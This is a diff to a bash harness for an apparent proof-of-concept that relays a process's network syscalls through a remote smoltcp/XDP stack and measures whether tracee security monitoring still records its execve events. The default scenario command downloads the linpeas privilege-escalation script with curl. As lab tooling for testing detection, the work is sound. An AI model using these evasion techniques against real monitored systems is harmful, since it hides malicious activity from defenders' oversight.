@@ -25,6 +25,9 @@
 #   --xdp-queue <n>     rsbeacon --xdp-queue                             (default: 0)
 #   --xdp-ip <addr>     rsbeacon --xdp-ip — smoltcp's own IPv4; must differ
 #                       from the beacon's kernel IP (required if smoltcp-xdp)
+#   --xdp-mtu <bytes>   rsbeacon --xdp-mtu — smoltcp has no PMTUD; required
+#                       when a tunnel sits on the path (auto-detected for
+#                       network-local via the kernel route cache)
 #   --events   <list>   Comma-separated tracee --events to capture       (default: execve,execveat)
 #   --query    <list>   Comma-separated substrings; only events whose
 #                       processName/eventName/args match ANY of them are
@@ -190,6 +193,10 @@ while [[ $# -gt 0 ]]; do
 		XDP_IP="$2"
 		shift 2
 		;;
+	--xdp-mtu)
+		XDP_MTU="$2"
+		shift 2
+		;;
 	--events)
 		TRACEE_EVENTS="$2"
 		EVENTS_SET=1
@@ -296,24 +303,53 @@ if [[ -n "$SCENARIO" ]]; then
 			# smoltcp can't reach the loopback stub resolver (127.0.0.53) —
 			# overlay /etc/resolv.conf with the subnet gateway's resolver via
 			# a host-bind mount in a generated profile variant of `relay`.
+			# `options single-request` is REQUIRED: glibc otherwise fires the
+			# A+AAAA queries with one sendmmsg() (not intercepted — seccomp
+			# can't read the mmsghdr array out of tracee memory), writing two
+			# datagrams back-to-back into the proxy's stream socketpair, where
+			# datagram boundaries are lost. Serial queries keep one datagram
+			# in flight per socketpair read.
 			local_gw=$(ssh "$BEACON_VM" "ip route show default | awk '{print \$3; exit}'") ||
 				die "could not detect default gateway on $BEACON_VM"
-			ssh "$BEACON_VM" "printf 'nameserver %s\n' '$local_gw' > /tmp/rsc-poc-resolv.conf"
-			ssh "$BEACON_VM" "cat > /tmp/rsc-poc-relay-local.yaml" <<'EOF'
-name: relay-local
-description: "relay + resolv.conf via gateway resolver (smoltcp can't reach loopback DNS)"
-mounts:
+			ssh "$BEACON_VM" "printf 'nameserver %s\noptions single-request\n' '$local_gw' > /tmp/rsc-poc-resolv.conf"
+			# Derive the generated profile from the REAL relay.yaml — a
+			# hand-copied syscall list here rotted once already (missing
+			# getsockname/getpeername/shutdown → local kernel answered
+			# getsockname on the proxy pair with AF_UNIX → glibc
+			# rfc3484_sort assert crash).
+			scp -q "$(dirname "${BASH_SOURCE[0]}")/../rsc/profiles/relay.yaml" "$BEACON_VM:/tmp/rsc-poc-relay-local.yaml" ||
+				die "could not copy relay.yaml to $BEACON_VM"
+			ssh "$BEACON_VM" "python3 - <<'PYEOF'
+import re
+p = '/tmp/rsc-poc-relay-local.yaml'
+s = open(p).read()
+s = s.replace('name: relay', 'name: relay-local', 1)
+s = s.replace('mounts: []', '''mounts:
   - remote: /tmp/rsc-poc-resolv.conf
     local: /etc/resolv.conf
-    type: host
-forward:
-  - name: network
-    syscalls: [socket, connect, bind, accept4, sendto, recvfrom, sendmsg, recvmsg, getsockopt, setsockopt]
-    filter:
-      default_direction: REMOTE
-EOF
+    type: host''', 1)
+open(p, 'w').write(s)
+PYEOF"
 			PROFILE="/tmp/rsc-poc-relay-local.yaml"
 		fi
+		# smoltcp has no PMTUD: learn the real path MTU from the kernel's
+		# route cache (a jumbo DF ping forces an ICMP PTB, caching the
+		# tunnel MTU) and hand it to rsbeacon via --xdp-mtu. Without this
+		# every internet-bound full-size segment from --xdp-ip blackholes.
+		if [[ -z "${XDP_MTU:-}" ]]; then
+			for attempt in 1 2 3; do
+				probe_ip=$(ssh "$BEACON_VM" "getent ahostsv4 github.com | head -1 | awk '{print \$1}'") || true
+				if [[ -n "$probe_ip" ]]; then
+					XDP_MTU=$(ssh "$BEACON_VM" "ping -M do -s 1450 -c 1 -W 3 '$probe_ip' >/dev/null 2>&1; \
+						ip route show cache '$probe_ip' | grep -oE 'mtu [0-9]+' | awk '{print \$2; exit}'")
+					[[ -n "$XDP_MTU" ]] && break
+				fi
+				info "path MTU probe attempt $attempt failed (probe_ip='${probe_ip:-}'), retrying"
+				sleep 2
+			done
+			[[ -n "$XDP_MTU" ]] && info "auto-detected path MTU $XDP_MTU → --xdp-mtu"
+		fi
+		[[ -n "${XDP_MTU:-}" ]] || die "could not auto-detect path MTU on $BEACON_VM; pass --xdp-mtu"
 		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 		# See the `network` scenario for why curl gets -0.
 		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
@@ -415,6 +451,10 @@ NETSTACK_ARGS="--netstack $NETSTACK"
 if [[ "$NETSTACK" == "smoltcp-xdp" ]]; then
 	NETSTACK_ARGS="$NETSTACK_ARGS --xdp-iface $XDP_IFACE --xdp-queue $XDP_QUEUE"
 	[[ -n "$XDP_IP" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-ip $XDP_IP"
+	# smoltcp has no PMTUD — when a tunnel/overlay sits on the path
+	# (lab DLP: MTU 1376) a 1500 MTU blackholes every full-size DF
+	# segment. --xdp-mtu, or auto-detected per scenario below.
+	[[ -n "${XDP_MTU:-}" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-mtu $XDP_MTU"
 fi
 
 # ── Print plan ───────────────────────────────────────────────────────────────
@@ -691,6 +731,14 @@ if [[ -n "$CLEANUP_CMD" ]]; then
 fi
 
 # ── Summary ──────────────────────────────────────────────────────────────────
+# A non-zero evasion run means the payload never executed (broken binary,
+# missing lib, crashed relay...) — zero tracee events in that state says
+# nothing about evasion. Fail loudly instead of reporting a vacuous PASS.
+if [[ "$EXIT_CODE" -ne 0 ]]; then
+	say "Comparison (matching events on $BEACON_VM)"
+	echo "${red}FAIL${reset} — evasion command itself exited $EXIT_CODE; event counts are meaningless."
+	exit 1
+fi
 if [[ "$COMPARE" -eq 1 && -n "$BASELINE_COUNT" ]]; then
 	say "Comparison (matching events on $BEACON_VM)"
 	echo "  baseline (no evasion): ${yellow}${BASELINE_COUNT}${reset} event(s)"
